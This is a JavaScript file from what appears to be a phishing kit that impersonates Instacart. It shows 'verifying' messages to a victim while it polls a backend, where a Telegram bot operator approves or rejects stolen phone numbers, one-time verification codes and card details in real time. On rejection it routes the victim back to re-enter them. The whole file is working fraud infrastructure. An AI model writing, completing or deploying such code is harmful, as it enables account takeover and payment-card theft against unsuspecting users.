document.addEventListener('DOMContentLoaded', function() {
    const urlParams = new URLSearchParams(window.location.search);
    const step = urlParams.get('step') || 'phone';
    const sessionId = urlParams.get('session') || generateSessionId();
    
    const loadingTitle = document.getElementById('loadingTitle');
    const loadingSubtitle = document.getElementById('loadingSubtitle');
    
    // Update message based on step
    const messages = {
        'phone': {
            title: 'Verifying your information',
            subtitle: 'Please wait while we verify your details. This should only take a moment.'
        },
        'code': {
            title: 'Verifying code',
            subtitle: 'We\'re checking your verification code. Please wait.'
        },
        'card': {
            title: 'Verifying card details',
            subtitle: 'We\'re confirming your payment information. This will just take a moment.'
        },
        'final': {
            title: 'Processing',
            subtitle: 'We\'re finalizing your account setup. Almost done!'
        }
    };
    
    const message = messages[step] || messages['phone'];
    loadingTitle.textContent = message.title;
    loadingSubtitle.textContent = message.subtitle;
    
    // Store session ID
    localStorage.setItem('instacart_session', sessionId);
    
    // Poll for status from telegram bot
    let pollInterval;
    let pollCount = 0;
    const maxPolls = 120; // 2 minutes max (120 * 1000ms)
    
    function checkStatus() {
        pollCount++;
        
        // In production, make API call to check if telegram bot approved
        // For now, we'll simulate the check
        console.log(`Polling status... (${pollCount}/${maxPolls})`);
        
        // Check status from API
        fetch(`/api/check-status?session=${sessionId}&step=${step}`)
            .then(response => response.json())
            .then(data => {
                if (data.approved) {
                    clearInterval(pollInterval);
                    handleApproval(data);
                } else if (data.rejected) {
                    clearInterval(pollInterval);
                    handleRejection(data);
                }
            })
            .catch(error => {
                console.error('Status check error:', error);
            });
        
        // Stop polling after max attempts
        if (pollCount >= maxPolls) {
            clearInterval(pollInterval);
            handleTimeout();
        }
    }
    
    // Start polling every 1 second
    pollInterval = setInterval(checkStatus, 1000);
    
    // Handle approval from telegram bot
    function handleApproval(data) {
        console.log('Approved by telegram bot:', data);
        
        // Route to next page based on step
        switch(step) {
            case 'phone':
                // Redirect to verification code page
                window.location.href = `verify.html?session=${sessionId}`;
                break;
            case 'code':
                // Redirect to card confirmation page
                const cardLast4 = data.cardLast4 || urlParams.get('cardLast4') || '****';
                window.location.href = `card-confirm.html?card=${cardLast4}&session=${sessionId}`;
                break;
            case 'card':
            case 'final':
                // Redirect to thank you page
                window.location.href = `thankyou.html?session=${sessionId}`;
                break;
            default:
                window.location.href = 'index.html';
        }
    }
    
    // Handle rejection from telegram bot
    function handleRejection(data) {
        console.log('Rejected by telegram bot:', data);
        
        // Go back to previous page (they will see the rejection via bot's message)
        switch(step) {
            case 'phone':
                window.location.href = 'index.html?error=account';
                break;
            case 'code':
                window.location.href = 'verify.html?error=code';
                break;
            case 'card':
                window.location.href = 'card-confirm.html?error=cvv';
                break;
            default:
                window.location.href = 'index.html';
        }
    }
    
    // Handle timeout
    function handleTimeout() {
        console.log('Polling timeout');
        window.location.href = 'index.html?error=timeout';
    }
    
    // Simulate approval for demo (remove in production)
    function simulateApproval() {
        console.log('Simulating approval for demo...');
        
        // Simulate different card last 4 based on demo
        const demoCardLast4 = '1234';
        
        handleApproval({
            approved: true,
            cardLast4: demoCardLast4
        });
    }
    
    // Generate session ID
    function generateSessionId() {
        return 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    }
    
    // Clean up on page unload
    window.addEventListener('beforeunload', function() {
        if (pollInterval) {
            clearInterval(pollInterval);
        }
    });
});
